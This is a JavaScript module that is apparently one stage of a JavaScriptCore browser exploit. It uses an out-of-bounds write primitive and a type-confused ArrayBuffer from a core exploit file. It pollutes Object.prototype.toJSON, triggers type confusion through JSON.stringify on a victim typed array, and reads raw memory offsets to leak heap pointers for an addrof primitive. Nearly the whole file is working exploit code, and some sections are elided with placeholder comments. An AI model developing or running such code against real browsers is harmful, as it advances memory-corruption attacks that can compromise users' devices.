// js/script3/testArrayBufferVictimCrash.mjs (v65_LeakFromCoreConfusedAB)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment,
    getStableConfusedArrayBuffer // Importar a nova função
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V65_LFCAB = "OriginalHeisenbug_TypedArrayAddrof_v65_LeakFromCoreConfusedAB";

// Variáveis globais ao módulo para captura de dados pela sonda
let captured_fuzz_reads_for_ConfusedAB_v65 = null;
let captured_fuzz_reads_for_NormalDV_v65 = null; // Para comparação

let leak_target_confused_ab_v65 = null; // O ArrayBuffer confuso do core_exploit
let leak_target_normal_dv_v65 = null; // Um DataView normal para controle

let victim_typed_array_ref_v65 = null;
let probe_call_count_v65 = 0;
let all_probe_interaction_details_v65 = [];
let first_call_details_object_ref_v65 = null;

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V65 = 10;
// Offsets para ler, incluindo os que getStableConfusedArrayBuffer pode ter alterado
// (JSCell.STRUCTURE_POINTER_OFFSET é 0x8)
const FUZZ_OFFSETS_V65 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38];

function toJSON_TA_Probe_LeakFromCoreConfusedAB_v65() {
    probe_call_count_v65++;
    const call_num = probe_call_count_v65;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V65_LFCAB,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v65),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v65 && first_call_details_object_ref_v65 !== null),
        this_is_leak_target_ConfusedAB: (this === leak_target_confused_ab_v65 && leak_target_confused_ab_v65 !== null),
        this_is_leak_target_NormalDV: (this === leak_target_normal_dv_v65 && leak_target_normal_dv_v65 !== null),
        fuzz_capture_status: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1_details_obj}. IsConfusedAB? ${current_call_details.this_is_leak_target_ConfusedAB}. IsNormalDV? ${current_call_details.this_is_leak_target_NormalDV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V65) {
            all_probe_interaction_details_v65.push({...current_call_details});
            return { recursion_stopped_v65: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details WITH PAYLOADS (ConfusedAB, NormalDV).`, "info");
            first_call_details_object_ref_v65 = current_call_details;
            if (leak_target_confused_ab_v65) current_call_details.payload_ConfusedAB = leak_target_confused_ab_v65;
            if (leak_target_normal_dv_v65) current_call_details.payload_NormalDV = leak_target_normal_dv_v65;
            all_probe_interaction_details_v65.push({...current_call_details});
            return current_call_details;
        }
        else if (current_call_details.this_is_leak_target_ConfusedAB && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET ConfusedAB! Fuzzing and capturing...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = new DataView(this); // 'this' é o Confused ArrayBuffer
                for (const offset of FUZZ_OFFSETS_V65) {
                    let low=0, high=0, ptr_str="N/A", dbl=NaN, err_msg=null;
                    if (view.byteLength < (offset + 8)) { err_msg = "OOB"; fuzzed_reads.push({ offset: toHex(offset), error: err_msg });}
                    else { low=view.getUint32(offset,true); high=view.getUint32(offset+4,true); ptr_str=new AdvancedInt64(low,high).toString(true); let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high; dbl=(new Float64Array(tb))[0]; fuzzed_reads.push({ offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl });}
                    logS3(`    ConfusedAB Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`, "dev_verbose");
                }
                captured_fuzz_reads_for_ConfusedAB_v65 = fuzzed_reads;
                current_call_details.fuzz_capture_status = `ConfusedAB Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
                all_probe_interaction_details_v65.push({...current_call_details});
                return { marker_confused_ab_fuzz_done_v65: true, call_num_processed: call_num };
            } catch (e) { current_call_details.error_in_probe = e.message; all_probe_interaction_details_v65.push({...current_call_details}); return { error_marker_v65: `ConfusedAB_Fuzz_${call_num}`, error_msg: e.message };}
        }
        else if (current_call_details.this_is_leak_target_NormalDV && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET NormalDV! Fuzzing and capturing...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = this; // 'this' é o DataView
                for (const offset of FUZZ_OFFSETS_V65) {
                    let low=0, high=0, ptr_str="N/A", dbl=NaN, err_msg=null;
                    if (view.byteLength < (offset + 8)) { err_msg = "OOB"; fuzzed_reads.push({ offset: toHex(offset), error: err_msg });}
                    else { low=view.getUint32(offset,true); high=view.getUint32(offset+4,true); ptr_str=new AdvancedInt64(low,high).toString(true); let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high; dbl=(new Float64Array(tb))[0]; fuzzed_reads.push({ offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl });}
                    logS3(`    NormalDV Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`, "dev_verbose");
                }
                captured_fuzz_reads_for_NormalDV_v65 = fuzzed_reads;
                current_call_details.fuzz_capture_status = `NormalDV Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
                all_probe_interaction_details_v65.push({...current_call_details});
                return { marker_normal_dv_fuzz_done_v65: true, call_num_processed: call_num };
            } catch (e) { current_call_details.error_in_probe = e.message; all_probe_interaction_details_v65.push({...current_call_details}); return { error_marker_v65: `NormalDV_Fuzz_${call_num}`, error_msg: e.message };}
        }
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is C1_details_obj (re-entry). Not modifying.`, "warn");
            all_probe_interaction_details_v65.push({...current_call_details});
            return this;
        } else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}. Ret marker.`, "warn");
            all_probe_interaction_details_v65.push({...current_call_details});
            return `ProcessedCall${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
        }
    } catch (e_probe) { /* ... (tratamento de erro similar ao v64) ... */ }
}

export async function executeTypedArrayVictimAddrofTest_LeakFromCoreConfusedAB() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V65_LFCAB}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (LeakFromCoreConfusedAB) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V65_LFCAB} Init...`;

    captured_fuzz_reads_for_ConfusedAB_v65 = null;
    captured_fuzz_reads_for_NormalDV_v65 = null;
    probe_call_count_v65 = 0;
    all_probe_interaction_details_v65 = [];
    victim_typed_array_ref_v65 = null;
    first_call_details_object_ref_v65 = null;

    // Tenta obter o ArrayBuffer confuso do core_exploit
    // Assumindo que getStableConfusedArrayBuffer pode precisar do ambiente OOB configurado
    // mas não deve ser limpo por ele, e é síncrono ou o chamador gerencia o async.
    // Para este teste, vamos configurar OOB, chamar getStable, e depois o exploit principal.
    // O getStableConfusedArrayBuffer pode poluir Object.prototype.toJSON, então precisa ser restaurado.
    let tempOriginalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    leak_target_confused_ab_v65 = getStableConfusedArrayBuffer(); // Chamada síncrona assumida
    if (tempOriginalToJSON) Object.defineProperty(Object.prototype, 'toJSON', tempOriginalToJSON);
    else delete Object.prototype.toJSON;

    if (!leak_target_confused_ab_v65) {
        logS3(`[${FNAME_CURRENT_TEST}] FALHA AO OBTER Confused ArrayBuffer do core_exploit. Abortando teste principal.`, "critical");
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V65_LFCAB}: ConfusedAB Fail`;
        // Limpar ambiente OOB se getStableConfusedArrayBuffer o configurou e falhou em retornar AB
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        return {
            errorCapturedMain: new Error("Failed to get Confused ArrayBuffer from core_exploit"),
            addrof_A_result: { success: false, msg: "Confused AB generation failed (v65)" },
            addrof_B_result: { success: false, msg: "Confused AB generation failed (v65)" },
            all_probe_calls_for_analysis: [], total_probe_calls:0
        };
    }
    logS3(`[${FNAME_CURRENT_TEST}] Confused ArrayBuffer obtido do core_exploit. Prosseguindo com o teste.`, "info");
    leak_target_normal_dv_v65 = new DataView(new ArrayBuffer(0x80)); // DV normal para comparação

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A";
    let stringifyOutput_parsed = null;
    let collected_probe_details_for_return = [];

    let addrof_A_result = { success: false, msg: "Addrof ConfusedAB: Default (v65)" };
    let addrof_B_result = { success: false, msg: "Addrof NormalDV: Default (v65)" };

    let pollutionApplied = false;
    let originalToJSONDescriptor = null; // Redefinir para o escopo do teste principal
    try {
        // O ambiente OOB já deve estar configurado por getStableConfusedArrayBuffer se ele usa triggerOOB_primitive.
        // Se não, precisamos chamar aqui. Para segurança, chamamos de novo, mas pode ser redundante.
        // A lógica em triggerOOB_primitive com force_reinit:false e isOOBEnvironmentSetup deve lidar com isso.
        await triggerOOB_primitive({ force_reinit: false }); // Não forçar reinit se já feito
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write for main test to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v65 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_LeakFromCoreConfusedAB_v65, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted for main test. Calling JSON.stringify(victim_typed_array_ref_v65)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v65);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); }
            catch (e) { stringifyOutput_parsed = {error_parsing_stringify: e.message, raw: rawStringifyOutput}; }

            logS3("STEP 3: Analyzing fuzz data captured in side-channels (v65)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false;

            const process_captured_fuzz_reads = (fuzzed_reads_array, target_addrof_result, objTypeName) => {
                // ... (mesma lógica de process_captured_fuzz_reads da v64) ...
                if (fuzzed_reads_array && Array.isArray(fuzzed_reads_array)) {
                    heisenbugIndication = true;
                    logS3(`  V65_ANALYSIS: Processing ${fuzzed_reads_array.length} captured fuzz reads for ${objTypeName}.`, "good");
                    for (const read_attempt of fuzzed_reads_array) {
                        if (read_attempt.error) continue;
                        const highVal = parseInt(read_attempt.high, 16);
                        const lowVal = parseInt(read_attempt.low, 16);
                        let isPotentialPtr = false;
                        if (JSC_OFFSETS.JSValue && JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH !== undefined && JSC_OFFSETS.JSValue.TAG_MASK !== undefined && JSC_OFFSETS.JSValue.CELL_TAG !== undefined) {
                           isPotentialPtr = (highVal === JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH && (lowVal & JSC_OFFSETS.JSValue.TAG_MASK) === JSC_OFFSETS.JSValue.CELL_TAG);
                        }
                        if (!isPotentialPtr && (highVal > 0 || lowVal > 0x10000) && (highVal < 0x000F0000) && ((lowVal & 0x7) === 0) ) { isPotentialPtr = true; }
                        if (isPotentialPtr && !(highVal === 0 && lowVal === 0) ) {
                            target_addrof_result.success = true;
                            target_addrof_result.msg = `V65 SUCCESS (${objTypeName} Fuzz Read): Potential Ptr ${read_attempt.int64} from offset ${read_attempt.offset}`;
                            logS3(`  !!!! V65 POTENTIAL POINTER FOUND for ${objTypeName} at offset ${read_attempt.offset}: ${read_attempt.int64} !!!!`, "vuln");
                            break;
                        }
                    }
                    if (!target_addrof_result.success) { target_addrof_result.msg = `V65 Fuzzed reads for ${objTypeName} did not yield pointer. First: ${fuzzed_reads_array[0]?.int64 || 'N/A'}`; }
                } else if (!target_addrof_result.success) { target_addrof_result.msg = `V65 No fuzz data in side-channel for ${objTypeName}.`; }
            };

            process_captured_fuzz_reads(captured_fuzz_reads_for_ConfusedAB_v65, addrof_A_result, "ConfusedAB");
            process_captured_fuzz_reads(captured_fuzz_reads_for_NormalDV_v65, addrof_B_result, "NormalDV (Control)");

            if (!heisenbugIndication && first_call_details_object_ref_v65) { /* ... (lógica de heisenbugIndication secundária) ... */ }

            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V65_LFCAB}: Addr SUCCESS!`;
            } else if (heisenbugIndication) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V65_LFCAB}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V65_LFCAB}: No Heisenbug?`;
            }
        } catch (e_str_outer) { errorCapturedMain = e_str_outer; /* ... */ }
        finally { /* ... (restauração do toJSON) ... */ }
    } catch (e_overall_main) { errorCapturedMain = e_overall_main; /* ... */ }
    finally {
        collected_probe_details_for_return = all_probe_interaction_details_v65.map(d => ({...d}));
        // Limpar o ambiente OOB PRINCIPAL. Se getStableConfusedArrayBuffer usou um ambiente
        // OOB separado ou deixou o global corrompido, isso pode ser complexo.
        // Por agora, clearOOBEnvironment() aqui limpa o ambiente OOB usado pelo triggerOOB_primitive principal.
        clearOOBEnvironment({force_clear_even_if_not_setup: true}); // Forçar limpeza
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        // ... (logs finais de addrof e limpeza de globais)
        victim_typed_array_ref_v65 = null;
        all_probe_interaction_details_v65 = [];
        probe_call_count_v65 = 0;
        first_call_details_object_ref_v65 = null;
        leak_target_confused_ab_v65 = null;
        leak_target_normal_dv_v65 = null;
        captured_fuzz_reads_for_ConfusedAB_v65 = null;
        captured_fuzz_reads_for_NormalDV_v65 = null;
    }
    return { /* ... (objeto de resultado similar ao v64) ... */ };
};
